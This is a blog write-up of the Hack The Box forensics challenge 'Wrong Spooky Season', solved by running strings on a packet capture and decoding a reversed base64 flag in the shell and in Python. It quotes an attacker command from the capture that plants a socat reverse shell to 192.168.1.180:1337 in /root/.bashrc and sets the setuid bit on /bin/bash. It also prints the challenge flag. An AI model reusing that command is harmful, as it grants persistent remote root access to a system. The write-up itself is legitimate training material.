---
layout: default
author: m0j0
---

![htb_ctf_2023](/assets/images/HTB_CTF_2023.jpg)


It's near upon me and the OUCSS team for the latest Uni CTF with Hack the Box.

I decided to go over some old write-ups from previous years and other events 
like [PicoCTF](https://play.picoctf.org/login) just to get that CTF mindset again.

It is a game of Love and Hate when playing CTF's for me but the key thing I 
have learnt over the years is not too get frustrated and just be happy that
you participated. We all are here to gain that little bit more knowledge and
these for sure give you some, albeit in a totally different format.

I have landed on [HTB's](https://app.hackthebox.com/challenges/wrong-spooky-season)
very easy Forensics challenge called **Wrong Spooky Season**.I gotta start somewhere
and very easy on HTB can be well... let's just find out by trying it. 

I'll show some methodolgy once I have cracked it.

Well I didn't think I'd get to update this so quick and as it is retired I can 
talk about it.

I didn't glance at anything for this as it was "very easy".

So I got some files to download and it turned out to be a `.pcap` file. The challenge
has a description:

```
 CHALLENGE DESCRIPTION

&quot;I told them it was too soon and in the wrong season to deploy such a website,
but they assured me that theming it properly would be enough to stop the ghosts from
haunting us. I was wrong.&quot; Now there is an internal breach in the `Spooky Network`
and you need to find out what happened. Analyze the the network traffic and find how
the scary ghosts got in and what they did.
```

Networking then and a website being deployed. I got stuck in. 
As I was unzipping the file with the password HTB supply I thought about
opening Wireshark a great tool for this that we all must know.


But... First I ran the simple but effective sometimes `strings` command.
Usually I run `strings -a whatever.pcap` for some low hanging fruit or juicy 
info to lead me on my way and `grep less` to run through the stdout.

I forgot the `less` command and at the end of the outputted strings a command:

```bash
echo 'socat TCP:192.168.1.180:1337 EXEC:sh' > /root/.bashrc && echo
"==gC9FSI5tGMwA3cfRjd0o2Xz0GNjNjYfR3c1p2Xn5WMyBXNfRjd0o2eCRFS" | rev > /dev/null &&
chmod +s /bin/bash
```
Looks familair to  `base64` encoded attempt at a shell on the target so I try the 
string:

```bash
m0j0@r1s1n: ~/HTB/challenges/forensics/wrong_spooky_season
$ echo -n "==gC9FSI5tGMwA3cfRjd0o2Xz0GNjNjYfR3c1p2Xn5WMyBXNfRjd0o2eCRFS" | base64 -d                                                       [13:40:17]
base64: invalid input
FAIL: 1

m0j0@r1s1n: ~/HTB/challenges/forensics/wrong_spooky_season
$ echo -n "==gC9FSI5tGMwA3cfRjd0o2Xz0GNjNjYfR3c1p2Xn5WMyBXNfRjd0o2eCRFS" | base32 -d                                                       [13:41:18]
base32: invalid input
FAIL: 1
```

As you can see I ran `base32` but then I realised why it had failed.  I was too
fast. If I flip the string what will it do?

So to flip for speed I used an [online site](https://www.textreverse.com/) but this 
could be done with python which I will do.

It gave me an output which I fed to the terminal:

```
m0j0@r1s1n: ~/HTB/challenges/forensics/wrong_spooky_season
$ echo -n "SFRCe2o0djRfNXByMW5nX2p1c3RfYjNjNG0zX2o0djRfc3AwMGt5ISF9Cg==" | base64 -d                                                       [13:42:14]
HTB{j4v4_5pr1ng_just_b3c4m3_j4v4_sp00ky!!}
```

Boom a flag!! That was very easy as rated and fun to brush off the cobwebs (:

This made me want to reverse the string and decode it with **Python** which can be done
fairly easy with Python. Below is my script.

```python
# importing the module
import base64

# assign the string from challenge
string = "==gC9FSI5tGMwA3cfRjd0o2Xz0GNjNjYfR3c1p2Xn5WMyBXNfRjd0o2eCRFS"

# assign variable and reverse it with a slice method then print
print("This is the string reversed:\n") 
convert_string = print(string[::-1])
print("\n")
convert_string = "SFRCe2o0djRfNXByMW5nX2p1c3RfYjNjNG0zX2o0djRfc3AwMGt5ISF9Cg=="

# converting the base64 code into ascii characters as each character in B64 is 6 bits
convert_bytes = convert_string.encode("ascii")

# converting into bytes from base64 system
converted_bytes = base64.b64decode(convert_bytes)

# decoding the ASCII characters into alphabets
decoded_sample = converted_bytes.decode("ascii")

# displaying the result
print(f"Here is the flag: {decoded_sample}")
# Here is the flag: HTB{j4v4_5pr1ng_just_b3c4m3_j4v4_sp00ky!!}  
```

![htb_ctf_2023](/assets/images/cert.jpg)

